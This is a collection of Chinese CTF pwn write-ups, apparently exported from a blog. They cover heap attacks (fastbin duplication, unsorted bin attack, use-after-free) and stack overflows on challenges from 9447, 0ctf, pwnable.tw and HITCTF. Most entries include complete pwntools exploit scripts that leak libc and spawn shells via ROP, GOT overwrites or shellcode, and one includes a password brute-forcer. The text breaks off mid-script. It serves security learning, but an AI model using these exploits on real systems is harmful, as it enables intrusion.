    <content type="text"><![CDATA[fastbin 劫持最近在看GitHub上的how2heap ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。 在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。 [TOC] fastbin劫持的原理fastbin劫持的原理是，在双重释放之后，fastbin上会有两个相同的chunk，当其中一个chunk被分配并能够进行写操作时，另一个留在fastbin链表里的chunk对应的内容也会发生改变，通过覆写FD指针，将链表中的下一个结点指向我们可以操控的地方。需要注意的是，fastbin再分配之前会先检查当前这个chunk的大小是否与申请的大小一致，因此伪造的fastbin chunk的size字段必须满足条件。 了解了原理之后再看search engine这道题。 search engine基本逻辑一个简单的搜索引擎，index a sentence输入一个句子，单词用空格作为分隔，每个单词放入一个结点中，记录单词的地址、大小以及所在句子的地址、大小，最后一个字段记录下一个结点的地址。单词链表类似于一个栈的结构，最后分隔的单词在链表的最顶端。一个node结点占40字节。 123456789struct node&#123; char * word; //8 bytes int word_size; //4 bytes int word_padding; //4 bytes char * sentence; //8 bytes int sentence_size; //4 bytes int sentence_padding;//4 bytes struct *next; //8 bytes&#125;; search with a word输入一个单词，从链表的头部开始查找相同单词，找到之后将对应的sentence置为0，并free sentence指针所指空间。 漏洞本题共有两个漏洞： 第二个漏洞我确实没看出来，大概是不细心&amp;平时我也是这么写的= = 释放sentence之后对应指针没有置零，UAF漏洞和double-free漏洞。 input_num函数可以泄露栈中的内容。strtol函数的第二个参数endptr返回的是字符串中不能转换为数字的地址，当输入的首个字符就不能转换为数字时，即&amp;nptr == endptr，input_num就会将输入的字符串打印出来。当输入的字符数量为48时，input_str不会向结尾加入NULL，由此可以读出字符串之后栈中的内容。 ​ 漏洞利用有了以上两个漏洞，再结合fastbin_dup_into_stack.c来看，我们需要泄露栈中地址，泄露libc地址（进而泄露system地址），将system函数写入栈中的返回地址处，执行system函数。 泄露栈地址（这个真的不是玄学吗？？） input_num函数是递归调用的，第一次输入48个字节后面没有其他东西，但是继续输入48个字节就有机会泄露栈中内容，即通过向上增长栈寻找可泄露的地址。 通过多次gdb的调试，发现泄露的内容是一个栈地址，但是我到现在还是不太明白，为什么这个栈地址加上某一偏移的地址其值能一直保持不变化。这里打一个问号。看别人的题解说，这里距离返回地址的位置比较近，可以确定的是，调用index sentence和 search word函数的返回地址都是0x400d60- 0x400e24范围内的，且压入返回地址的位置永恒不变，可以确定通过泄露的栈地址计算返回地址的栈地址，但是如何定位到含有“0x40”的地址，还没有搞清楚。 泄露libc地址 UAF漏洞可以达到这个目的。试想如果sentence（简称s1）的大小与一个node一样，都是40 bytes，那么当释放s1空间后，再输入一个新的sentence（简称s2，保证大小不是32-40字节，防止将刚释放的s1分配给它），这时会建立一个新的node（简称n2）存放word信息，就会将刚释放的s1的空间分配给n2，而且也能保证s1空间不再为NULL，绕过了对内容是否为空的检查：*（node + 16）！=NULL。 由于s1释放之后没有把指针置空，导致原来的node的word和sentence指针仍指向原来的位置，通过search并删除s1，使 n2 引用的是已释放的空间。 继续把已经释放的s1分配给新的sentence（简称s3），并通过向s3里写内容，伪造一个假的node结点，使其中sentence指针指向puts@got，这样在search成功之后，就会输出puts@got中的puts地址，从而泄露libc地址。 system函数覆盖栈中返回地址 按照其他大佬的思路，在泄露的栈地址之后找到了0x40用于表示chunk_size的地址，且距离返回地址较近，接下来就可以通过fastbin劫持将fastbin链表结点指向这个栈中地址。 为了配合0x40这个大小，可以新建两个0x40长度的sentence a和b，按照程序逻辑b对应的node结点将会在word链表的顶端。 然后通过search删除它们，fastbin中的结构如下: fastbin -&gt; a-&gt;b-&gt;NULL，由于node中的指针并没有置零，因此search的时候还会去检查已经释放的a和b空间是否符合条件。 search（’\x00’），先从word的顶端b对应的node开始检查，由于b中的FD指针为NULL，它不能通过（node + 16）！=NULL 的检测，接着来到a对应的node，即使node能够满足条件，但是*由于a是fastbin中的第一个chunk，释放它将会引发错误。因此我们可以在最开始时候新建3个sentence a,b,c。这样fastbin中就是：fastbin -&gt;a -&gt;b -&gt; c -&gt; NULL ，然后再search(‘\00’)，删除掉b保留a，达到双重释放的目的，fastbin结构变成：fastbin -&gt;b -&gt;a -&gt;b -&gt;…… 释放之后，再申请相同大小的sentence导致b空间被分配，并通过改写b从而改掉处于fastbin中b的FD指针，使其指向栈中假的chunk。 接着把剩余的a和b再分配出去，再申请sentence将会返回栈中的假chunk，以写sentence的内容覆写返回地址。 exp（栈中偏移地址部分参考了其他大佬的数据，整体思路也是顺着这位大佬来的） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from pwn import *context(arch="amd64", os="linux")context.log_level = 'debug'p = process("./search")def leak_stack(): p.recvuntil("Quit\n") p.sendline("a"*48) p.recvline() p.sendline("b"*48) leak = p.recvline().split(' ')[0][48:] return int(leak[::-1].encode('hex'), 16)def index(sentence): #p.recvuntil("Quit\n") p.sendline("2") p.recvuntil("Enter the sentence size:\n") p.sendline(str(len(sentence))) p.recvuntil("Enter the sentence:\n") p.sendline(sentence)def search(word): p.recvuntil("Quit\n") p.sendline("1") p.recvuntil("Enter the word size:\n") p.sendline(str(len(word))) p.recvuntil("Enter the word:\n") p.sendline(word)def leak_libc(): sentence = 'a'*12 + ' b ' sentence = sentence.ljust(40,'c') index(sentence) #delete s1 search('b') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') #n4 use s1 index('d'*64) #delete s1,but n4 still can use it=&gt;UAF search('\x00') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') #a new sentence share space with n4 puts_got = 0x602028 node =p64(0x400E90) #"Enter" node += p64(5) node += p64(puts_got) node += p64(64) index(node) #search 'Enter' to leak puts_address search('Enter') p.recvuntil("Found 64: ") puts_addr = u64(p.recv(8)) print "###puts_addr:0x%x" %puts_addr p.recvuntil("Delete this sentence (y/n)?") p.sendline('n') return puts_addrdef overwrite_retn(): index('a'*54+' d') index('b'*54+' d') index('c'*54+' d') # a-&gt;b-&gt;c-&gt;NULL search('d') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') # b-&gt;a-&gt;b-&gt;c-&gt;NULL search('\x00') p.recvuntil("Delete this sentence (y/n)?") p.sendline('y') p.recvuntil("Delete this sentence (y/n)?") p.sendline('n') # fake fastbin index(p64(stack_addr).ljust(56,'e')) # malloc a and b index('f'*56) index('g'*56) # overwrite the ret address with gadget pop_ret = 0x400e23 sentence = 'A'*30 sentence += p64(pop_ret) sentence += p64(binsh_addr) sentence += p64(system_addr) index(sentence) #leak stack addressstack_leak = leak_stack()stack_addr = stack_leak + 0x22 - 8#leak libc addressputs_addr = leak_libc()libc = ELF('libc.so')system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])binsh_addr = puts_addr - (libc.symbols['puts']-next(libc.search('/bin/sh')))#double free to edit the retn address in stackoverwrite_retn()p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unsortedbin_attack--0ctf zerostorage]]></title>
    <url>%2F2018%2F03%2F13%2Funsortedbin-attack-0ctf-zerostorage%2F</url>
    <content type="text"><![CDATA[unsortedbin attack代码中存在UAF漏洞时，可以通过操纵unsorted bin 的BK指针时，使其修改某一变量的值。举一个简单的例子: shellphish/how2heap/unsorted_bin_attack 一个unsorted bin，称为victim，victim具有UAF漏洞，则在释放后操作victim时，可以修改victim-&gt;bk为需要修改的变量var的地址-0x10，即&amp;var-0x10，这样在再次将victim分配时，会进行unlink操作，将var的值修改为unsorted bin头的地址： 123bck = victim-&gt;bk; //bck = &amp;var-0x10unsorted_chunk(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunk(av) //*(&amp;var-0x10+0x10) = unsorted_chunk(av) =&gt; var = unsorted_chunk(av) 典型的应用是修改global_max_fast，这个全局变量代表着fastbin 中能够放入的最大chunk的大小，通过修改这个值可以让所有的chunk释放之后都挂在fastbin上，由于fastbin的结构简单，是单链结构，进而进行fastbin攻击。 实例：0ctf zerostorage基本逻辑典型的对堆进行操作的题： insert函数中可以看出，有一个全局数组entries，应该是一个结构体数组，每一个结构体占24个字节，前四个字节记录是否使用中，接着四个字节的padding，然后是8字节的长度和8字节的内容地址信息，这里地址信息不是直接记录的，而是通过与/dev/urandom中的数字异或后存放的。 content内容地址的分配内存是分三种情况：x&lt; 128 直接分配大小为128；128&lt;=x&lt;=4096 分配大小为x；x&gt;4096只分配4096大小。 update函数用于重新编辑content，必要时重新分配内存，修改length和content addr。 merge函数合并两个entry对应的content，释放第一个entry的content，将第一个entry各项置零，并重新找到一个entry，把合并后的content地址赋给新的entry 的 content addr。 delete函数释放entry的content addr 所指的内存，并将指针置零，entry中的各项也置零，很安全，是free的正确使用方法。 view函数查看内容 漏洞虽然本题的delete函数非常安全，但是在merge函数中，如果输入的两个编号一样，将会先free 然后又把指针给另一个entry，即UAF。 漏洞利用本题开了所有保护，关键是PIE 本题还提到一条，之后会用到： 1Notice: Latest Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel. libc地址泄露： 第一个释放的chunk（不是fastbin），其FD和BK指针都指向main_arena中bins结构中的unsorted bin头，main_arena中的各个值存放于libc中的bss段，因此，可以在merge 之后读取这一块的前八个字节，正好是libc中的地址，通过偏移可以计算出libc的基址。 由于本题开了PIE，因此不能直接获取程序中指令的地址，但是在 Notice中提到的【Ubuntu 14.04.4 LTS, with 3.13.0-79-generic kernel】的操作系统存在着offsetlibc的漏洞，也就是说可以从libc的基址推断出程序的基址。 unsorted bin attack修改global_max_fast的值： update上一步提到的块，将BK修改为&amp;global_max_fast -0x10，FD修改为一个较大的值。再insert一个新的entry时，会将这个块从unsorted bin上unlink后分给新 entry的content，由此完成了对global_max_fast值的改写，接下来的所有块都将属于fastbin的范围。 fastbin劫持用于读取random的值： 再merge另外两个相同的块，此时释放的块将挂在fastbin上，设某一已经分配的entry的index为idx1，利用UAF修改该fastbin的FD指针为entries[idx1]，且保证entries[idx1]和merge的块在fastbin中的大小相同，如均为144，因为fastbin在分配时候会首先检查chunk的size字段是否为当前链中应该的大小。 之后再insert两次，第一次将merge的块从fastbin中摘除，此时fastbin的头就指向了entries[idx1]，第二次insert就把entries[idx1]分给了新的entry 称为 entries[idx3]，即entries[idx3]的content addr指向entries[idx1]。由于entries[idx3] + 0x16中记载的是entries[idx1]^random，通过update idx3将这个值读出后异或entries[idx1]，由此得到random的值 这次的shell的执行没有用system，学到了一个新的知识： one_gadget 再次update idx3，修改idx1下一个entry idx2的content addr处为 free_hook^ random，这样再update idx2时，相当于修改free_hook的值，将其写为one_gadget的地址。 exp由于目前手中没有Ubuntu 14.xx的系统，在此只记录思路，之后再做具体复现，exp可以参考 Hanquing Zhao 思路： 用#0，#1，…代表entries[0]，entries[1]；&amp;0，&amp;1，….代表堆上分配的各个content编号 123456789101112131415161718192021222324insert #0 -&gt; &amp;0insert #1 -&gt; &amp;1insert #2 -&gt; &amp;2merge #1,#1 =&gt; #3-&gt;&amp;1(已free)view #3 =&gt;读FD 泄露libc地址，进而获取one_gadget地址、entries地址和free_hook地址update #3 =&gt;覆写global_max_fast的值，之后所有chunk都属于fastbininsert #1 -&gt; &amp;1insert #4 -&gt; &amp;3insert #5 -&gt; &amp;4merge #4,#4 =&gt; #6-&gt;&amp;3(已free)update #6 =&gt;FD的值写成#5（entries[5]）的地址insert #7-&gt;&amp;3insert #8-&gt;#5 view #8 =&gt;获取random的值update #8 =&gt;覆写#6的各个字段，重点是将content_addr写为random^free_hookupdate #6 =&gt;在free_hook中写入one_gadget地址delete #0 =&gt;调用free_hook即one_gadget]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw-silver_bullet]]></title>
    <url>%2F2018%2F03%2F08%2Fpwnable-tw-silver-bullet%2F</url>
    <content type="text"><![CDATA[silver_bullet基本逻辑依旧是菜单类型的小游戏： 这道题就是create一个silver bullet（简称sb），输入的字符串长度就是sb的能量，power up会用strncat连接上新输入的字符串，仍旧是长度是能量，然后能量达到一定值时beat ，然后返回。 漏洞power_up函数中，用到了strncat，而该函数会在末尾主动加入\0。这个操作有机会覆盖s[48]，即记录字符串长度的最低位。 漏洞利用考虑到power_up只在s[48]&lt;=47时起作用，可以分两次操作：先create一个47长度的sb，然后power_up 1，通过strncat，\0就会覆盖s[48]，再计算长度时就为0+1=1 这样就可以继续再写47个字符了，并且是从s[48]之后开始写。 继续写的字符可以伪造ROP，当然为了返回，应该首先执行beat函数，将s[48]的之后三位写成FF FF FF，这样当以int类型读取字符串大小时（即从s[48]开始，长度为4的int），大小为FFFFFF01，就可以利用beat成功返回了。 system函数地址泄露：通过puts输出函数地址，从而泄露system的地址。因为可以继续写47个字符，将有机会覆写main的返回地址。将main的返回地址写为puts@plt，并在此处构造ROP结构，称为ROP1，puts函数的参数为puts@got，即读出puts的实际地址，进而泄露system地址。由于ROP1中不能继续构造新的ROP，因此将返回地址位置写为一个gadget。 system函数调用： 1）写入system函数–read_input：上一步只是泄露了system的地址，并未写入到栈结构中，因此需要另一次机会将system地址写入，程序中提供的read_input函数正好可以实现这个功能。这就要求从puts函数返回之后应该继续执行read_input函数，找到一个pop|retn 的gadget作为ROP1 的返回地址，执行时先pop出puts@got，再返回read_input。 接着构造一个read_input函数的ROP结构，称为ROP2。由于栈溢出只能再写47个字节，再写一个system的ROP结构不够用，因此考虑在另一块空间继续写入system的ROP结构。这个空间可以选在BSS段之后的地址，起名为fake_addr。read_input的第一个参数为fake_addr，第二个参数为大小，返回地址争取直接跳到fake_addr处。 在覆写main函数返回地址时将ebp覆写为fake_addr，之后保证ebp不变，在ROP2的返回地址处写入leave|retn的gadget使得 leave时 esp = ebp = fake_addr，pop ebp，然后返回执行system函数。 2）system函数的ROP：先是一个随意的值用于pop ebp，接着写入system地址和参数。 整体的栈结构如下： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level='debug'debug = 0if debug: p = process('./silver_bullet') libc = ELF('./libc.so')else: p = remote('chall.pwnable.tw',10103) libc = ELF('./libc_32.so.6')d = 0#gdb.attach(p,'b*0x80485eb')# create size:47p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Give me your description of bullet :')payload1 ='a' * 47p.send(payload1)# overflow size:1p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Give me your another description of bullet :')payload2 ='b'p.send(payload2)#overwrite stackp.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Give me your another description of bullet :')puts_plt = 0x80484a8puts_got = 0x804afdcfake_addr = 0x804b410pr_addr = 0x08048475lr_addr = 0x8048a18read_input = 0x80485ebpayload3 = '\xff' * 3 + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(0x1011)p.send(payload3)#beat and execute p.recvuntil('Your choice :')if d: gdb.attach(p)p.sendline('3')p.recvuntil('Oh ! You win !!\n')puts_addr = u32(p.recv(4))system_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])print 'puts_addr: 0x%x' %puts_addr#read_input contentpayload = p32(fake_addr) + p32(system_addr) + p32(0xdeadbeef) + p32(fake_addr + 0x10) + '/bin/sh'p.send(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw--hacknote]]></title>
    <url>%2F2018%2F03%2F08%2Fpwnable-tw-hacknote%2F</url>
    <content type="text"><![CDATA[hacknote基本逻辑这又是一道malloc相关的内存题目，但是不是老套路。三个函数：add_note，delete_note和print_note。 使用add_note分配的地址用一个堆表（自己起的名字）存放，（其实就是一个存放地址的数组）。通过add_note可以看出分配的每个块是什么结构： 首先在ptr[i]中存放一个8字节大小的block（实际malloc分配了16字节）地址；然后这个地址中（称为note块）前4个字节是一个函数地址，即输出地址+4中的内容： 另外四个字节存放一个新分配的content块的地址，大小size由用户进行输入。对于一个初始状态的地址空间，add_note后的结构如下： delete_note就是先释放content地址这块空间，再释放malloc（8）这块空间。 print_note就是调用note块的第一个字段即puts函数 漏洞deltenote将note和content释放之后并没有将ptr[i]置为空，也就是说，虽然指针所指向的内存释放掉了，但实际内容还在，我们仍然能使用，即UAF。 漏洞利用本题的关键点是，当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。 system函数地址泄露：print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。 system函数调用：同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。 这里涉及一个知识点：Linux连续执行多条命令http://blog.csdn.net/freedom2028/article/details/7104131 仔细看print_note，最终调用函数时，参数也是同一个地址： 即，如果将puts函数地址覆盖为system地址，system的参数是system函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将content位置覆盖成 ‘;sh\0’. exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level='debug'def add_note(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Note size :') p.sendline(str(size)) p.recvuntil('Content :') p.send(content)def delete_note(index): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index))def print_note(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))debug = 0 if debug: p = process('./hacknote') libc = ELF('./libc.so')else: p = remote('chall.pwnable.tw', 10102) libc = ELF('./libc_32.so.6')add_note(128,'aaaa')add_note(128,'bbbb')delete_note(1)delete_note(0)payload = p32(0x804862b)+p32(0x804A018)add_note(8,payload)print_note(1)free_addr = u32(p.recv(4))print "free_addr:%x" %free_addroffset = libc.symbols['system'] - libc.symbols['free']system_addr = free_addr + offsetdelete_note(2)payload = p32(system_addr) + ';sh\0'add_note(8,payload)print_note(1)if debug: gdb.attach(p)print "offset:%x,system_addr: %x" %(offset,system_addr)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCTF PWN]]></title>
    <url>%2F2018%2F02%2F07%2FHITCTF-PWN%2F</url>
    <content type="text"><![CDATA[STACK OVERFLOW基本逻辑main函数调用vuln函数，vuln函数中输入name字符串： 漏洞vuln函数中buf的地址是ebp-28h，即buf大小为0x28，但在读入字符串时，read参数是0x40，即栈溢出漏洞。 漏洞利用保护机制： NX堆栈不可执行 在IDA的函数一栏发现有一个flag的函数，利用该函数执行shell ： 通过栈溢出构造ROP：将vuln函数返回地址覆盖为flag，同时写入flag函数执行所需要的参数a1和a2。 exp123456789101112131415161718192021222324252627from pwn import *context.log_level = 'debug'debug = 0flag_addr = 0x080485DFif debug: p= process("./stackoverflow")else: p = remote("111.230.132.82",40000)payload= 'a'*44payload += p32(flag_addr)payload += p32(0xdeadbeef) + p32(0xdeadbeef)+p32(12648430)p.recvuntil("Welcome to pwn world!\nLeave your name:")p.sendline(payload)p.interactive() login基本逻辑 main函数首先调用login()函数，用户输入username和password后，与服务器端预设的值进行比较。有两个用户：root和lilac。需要注意的是，strncmp的第三个参数，这个参数代表需要比较多少个字符。仔细看login函数中的strncmp是有问题的。（见2.漏洞） 从login返回之后，main函数会对登录是否成功进行判定，只有当用户为root且通过了login函数的比对操作才能继续进行，其余情况都会直接exit。而且即使login函数通过了之后，main函数还接着调用了check()函数来再次检查用户名和密码。注意，仔细查看login和check函数中的strncmp的第三个参数是不一样的：login中第三个参数是用户输入的长度，check中是指定的长度。 漏洞123456n = read_input_raw(username, 16);v3 = read_input_raw(password, 32);if ( !strncmp(username,"root",n)&amp;&amp;!strncmp(password,"passwd_has_be_changed_in_remote_", v3) ) &#123; v1 = 0; &#125; login函数第三个参数是用户输入的字符串长度，比如，我们只输入一个字符，那么strncmp就只比较两个字符串的一个字符，如果恰巧蒙对了，strncmp就返回0（代表相等）；没蒙对就继续蒙，直到蒙到第一位是正确的。由此，可以通过暴力破解依次获取每一位password。需要注意的是，我们拿到的可执行文件和服务器上的不是一个，出题人在password处暗示我们了：passwd_hasbe changed_inremote 漏洞利用从check函数中可以看出，root用户的密码为32位。通过暴力破解，多次启动进程，从返回结果是否是”How can you login successful as root!”来判断该位是否正确。可以通过查看ASCII表中可见字符的范围来缩小暴力破解的次数，我用的是33-126。 exp12345678910111213141516171819202122232425#暴力破解debug = 0for num in range(0,32): for i in range(33,126): if debug: p= process("./login") else: p = remote("111.230.132.82",40001) p.recvuntil("Username: ") username = "root" p.sendline(username) p.recvuntil("Password: ") tmp = pwd+chr(i) p.sendline(tmp) hint = p.recvline() #print hint if "How can you login successful as root!" in hint: pwd+=chr(i) p.close() print pwd break p.close()print pwd 1234567891011121314151617#发送正确的username和passwordfrom pwn import *context.log_level = 'debug'debug = 0if debug: p= process("./login")else: p = remote("111.230.132.82",40001) p.recvuntil("Username: ")username = "root"p.sendline(username)p.recvuntil("Password: ")pwd="XXXXX" #此处就是上一步暴力破解获取的pwdp.sendline(pwd)p.interactive() DragonBall基本逻辑一个小游戏，一共有15块，要集齐七个龙珠才能许愿，我们能实现的操作有买龙珠、卖龙珠、打印龙珠和对着龙珠许愿：P。 买的时候龙珠5块钱一个，但是注意，if里面只判断了money是否为0，并没有判断&gt;0 卖的时候龙珠只有3块钱，但这里在后续我们利用漏洞起到了一定作用。 wish函数里，向v1里读入wish字符串，向v2里读入yes or no，正常人会用这么大的缓冲区放yes和no吗？？v2分配了0x38大小，但是读入的时候读了0x40个字符，也就是说可以有8个字节的缓冲区溢出。v1分配了0x30大小，但是读入的时候读了0x68个字节。 漏洞首先，buy函数里，只要money不是0，是负数也无所谓，可以无穷尽的买卖，这样很快就能达到7个龙珠了。 其次，wish函数里v1和v2都可以进行缓冲区溢出。v1读入的0x68个字节可以占用v2的空间，v2读入的0x40正好可以修改返回地址。 漏洞利用保护机制：喜大普奔！这题没有开NX！也就是可以在栈上写入shell并执行 利用的思路就是：在v1或v2的位置写入shell，然后要获取栈地址，并将这个地址通过v2写入wish的返回地址，最后wish返回之后就能直接执行shell。 其余都好弄，就是如何获取栈上的地址。在gdb调试过程中，通过查看栈，发现此时ebp的值为0xffffc818，向上两个单元中的值总是和ebp相差0x10，而这个位置正好可以通过读取v1来得到，这样就得到了栈上的地址。可以发现，wish中会将v1中的内容打印出来（Your wish is %s…）。由此，先将v1中这个位置之前的内容都填满，共0x68-8=0x60个字节，其中包含着可执行的shell；然后再通过v2将返回地址的位置填上v1的地址即可。 exp1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level='debug'debug = 0if debug: p = process('./DragonBall')else: p = remote('111.230.132.82',40002)#buy dragonballfor i in range(0,2): p.recvuntil('You choice: ') p.sendline('1')p.recvuntil('You choice: ')p.sendline('2')for i in range(0,6): p.recvuntil('You choice: ') p.sendline('1')#make a wishp.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')shellcode = asm(shellcraft.sh())payload = shellcode.ljust(0x60,'a')p.sendline(payload)p.recvuntil('Your wish is ')p.recv(0x60)stack_addr = u32(p.recv(4))wish_addr = stack_addr-0x10-0x68print "wish_addr:0x%x"%wish_addrp.recvuntil('is it right?\n(Y/N) ')payload = 60*'a'+p32(wish_addr)p.sendline(payload)p.interactive() nodes基本逻辑主要是对一个单向链表上的节点进行操作。 set_size函数是对BSS段上的一个值进行初始化，设置为48，这个字段后续要作为read函数的第三个参数。 main函数中限定了节点数最多为149. add_node函数，首先判断头节点是否存在，如果存在，就通过后向指针循环寻找下一节点，直到找到链表的尾部，添加新的节点；如果不存在，就构建头节点后再添加新的节点。 这里可以看见，read函数的第三个参数就是之前set_size函数里设置为48的那个字段unk_804a080。 通过add_node函数，可以了解到每一个节点的结构如下： edit_node函数通过value作为索引，找到对应节点，修改其data内容。 print_node顺序打印链表中每个节点的value和data。 漏洞说实话，这题的漏洞对我隐藏的太深了，我大概看了三个小时才找到漏洞。 main函数中的case 1，会打印已有的节点数，其中这个byte_904a060是一个bss段上的字段。 1sprintf(byte_804A060, "You have already insert %d nodes", nodes_num); 在bss段找到它，发现它实际分配了32字节的空间。 数一下You have already insert XXX nodes字符串，如果nodes_num是3位数，那么字符串长度为33位，也就是说，当添加的节点数大于等于100时就会触发堆溢出漏洞。从上图能够看出，byte_904a060之后正好就是 unk_804a080,就是最开始设置为48的read参数，一旦堆溢出，byte_904a060的最后一个字符s就会覆盖 unk_804a080，即read可以读入的字符串长度变成0x73，覆盖next指针的值，再次调用print_node时就会泄露内存。 漏洞利用system函数地址的泄露：首先申请100个节点，这时会造成堆溢出漏洞。这样read的第三个参数变得很大，通过edit_node将第99个节点的next指针覆写为puts函数的got表地址。再调用print_node时，第100个节点的地址就会变为puts函数的got表地址puts@got，打印出来的value也就是当前puts函数的真实地址。再通过libc中puts与system的相对便宜进一步得到system函数地址。再通过edit_node操作第100个节点，修改puts@got中的内容为system函数地址。 system函数调用： 当程序中调用puts时就相当于调用了system函数，可以事先在第一个节点的data中写入/bin/sh参数，当调用print_node时，触发puts(data)，即执行了system(‘/bin/sh’) exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *import timecontext.log_level='debug'debug = 0puts_got = 0x0804A024if debug: p = process('./nodes') libc = ELF('./libc.local.so')else: p = remote('111.230.132.82',40003) libc = ELF('./libc.so.6')#add 100p.recvuntil('please input your choice:')p.sendline('1')p.recvuntil('Value:')p.sendline('1')p.recvuntil('Data:')p.sendline('/bin/sh')for i in range(2,101): #time.sleep(1) p.recvuntil('please input your choice:') p.sendline('1') p.recvuntil('Value:') p.sendline(str(i)) p.recvuntil('Data:') p.sendline('')#edit no.99p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil("Node's value:")p.sendline('99')p.recvuntil('New value:')p.sendline('99')p.recvuntil('New data:')p.sendline('a'*48 + p32(puts_got))#list -&gt; leak puts_addrp.recvuntil('please input your choice:')p.sendline('3')p.recvuntil("Your nodes:")for i in range(1,100): p.recvuntil('Value:') p.recvuntil('Data:')p.recvuntil('Value:')puts_addr = int(p.recv(10))print "puts_addr:0x%x" %puts_addrsystem_addr = puts_addr - (libc.symbols['puts']-libc.symbols['system'])print "sys_addr:0x%x" %system_addr#edit 100p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil("Node's value:")p.sendline(str(puts_addr))p.recvuntil('New value:')p.sendline(str(system_addr))p.recvuntil('New data:')p.sendline(p32(system_addr))#listp.recvuntil('please input your choice:')p.sendline('3')p.interactive() babynote基本逻辑菜单类的题目，可以添加、编辑、删除和打印note。 add函数限定了note数量最多为3。通过add函数，能够看出程序管理每一块note的方法：有一个list数组用于存放每一个note的首地址，每一个note的大小是12字节，依次存放note中content的大小、content的地址和puts函数地址。 edit函数通过note的编号作为索引修改content的内容。 prints函数调用每一个note中的第三个字段（正常来说是puts函数地址）来打印每一个note的内容。 delete函数释放note的content地址空间和note地址空间，然而并没有将指针置0. 漏洞在delete函数中，被释放的指针没有置空，导致UAF（use after free）漏洞，即可以对已释放的内继续进行操作。 漏洞利用非常不巧，本题开了PIE保护，即程序的地址也不再是固定不变的了，漏洞的利用变得更加困难。 system函数的地址泄露： 涉及了一个新的知识点：main_arena。main_arena存在于libc的BSS段中，用于存放各种bin的头结点信息，如fastbin，smallbin和unsortedbin等。本题中，当最开始add了一个note，并设置content大小为一个大于64字节的数（例如100），再delete这个note时，这一块内存会首先放入unsortedbin当中，并将FD和BK设置为main_arena中unsortedbin的头结点地址。 可以通过调试查看，在100字节的content没有被释放时，main_arena的结构是这样的： 释放这个note之后，main_arena如下： 其中bins里存放的就是各类型的bin头结点的地址，发现0x5824b010就是unsortedbin头结点的地址，查看0x5824b010，就能看见刚刚释放的content 地址。 因此，system函数的地址泄露可以通过读取已释放的content的前四字节（FD指针）泄露libc的地址，进而泄露system的地址。 system函数的覆写和调用： 本题中note固定占用12字节，属于fastbin。当某一content正好也要申请12字节空间时，系统会先再fastbin上寻找是否有大小相同的chunk，如果有就会直接分配给content。如果这个chunk是之前释放的note，那么利用UAF漏洞，就可以修改内存。 先申请第一个note(note#0)，其content大小为100字节。再申请第二个note(note#1)，其content(content#1)大小为12字节。释放note #1和note #0。由于fastbin是LIFO的原则，此时fastbin上的chunk顺序为：note#0-&gt;note#1-&gt;content#1。此时再申请第三个note(note #2)，并要求content也为12，系统从fastbin中顺序摘下大小为12的chunk进行分配，那么note#2对应的就是note#0，content#2对应的就是note #1。 此时向content#2输入，就会覆写掉note#1原本的内容，将前两个字段写成/bin/sh，第三个字段写成system函数地址；然后再调用prints对note#1操作，就相当于直接调用了system函数。 PS:在调试过程中可以通过vmmap来查看，FD指针与libc其实地址的相对偏移offset。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *context.log_level='debug'debug = 0if debug: p = process('./babynote') libc = ELF('./libc.local.so')else: p = remote('111.230.132.82',40004) libc = ELF('./libc.so.6')offset = 0x1b27b0def add(size,content): 